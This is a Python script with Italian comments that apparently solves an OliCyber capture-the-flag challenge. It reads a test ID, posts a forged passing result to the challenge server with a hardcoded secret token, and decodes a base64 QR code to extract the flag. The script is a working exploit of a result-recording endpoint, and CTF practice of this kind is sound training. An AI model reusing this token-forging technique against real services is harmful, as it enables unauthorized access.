import requests
import re #richieste di pattern di stringhe
import PIL.Image #lavora con le immagini
import base64
import io #per streem di dati
from pyzbar.pyzbar import decode

host = "http://flag-pass.challs.olicyber.it"

secret_token = "8218d355-38ff-4bc3-9336-adf7f1ba55be"

r = requests.get(host + "/test")
test_id = re.search(
    r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", r.text
)[0] #ottine l'ID del test del server


r = requests.post(
    host + "/record_result",
    json={"token": secret_token, "test_id": test_id, "result": True},
) #invia risultato del test

assert r.status_code == 200 #nessun errore OK

r = requests.get(host + "/pass", params={"id": test_id}) #per ottenere password

x = re.search(r"base64,([\w/+=]+)\"", r.text)[1] #cerca una stringa che inizi con "base64," seguita da una sequenza di caratteri alfanumerici, "+", "/" o "=", e termini con una virgoletta "" #espressione regolare per ottenere la stringa

img = PIL.Image.open(io.BytesIO(base64.b64decode(x))) #decodifica QRcode

decoded = decode(img)

flag = re.search(r"flag{.+}", decoded[0].data.decode())[0] #espressione regolare per ottenere la stringa

print(flag)
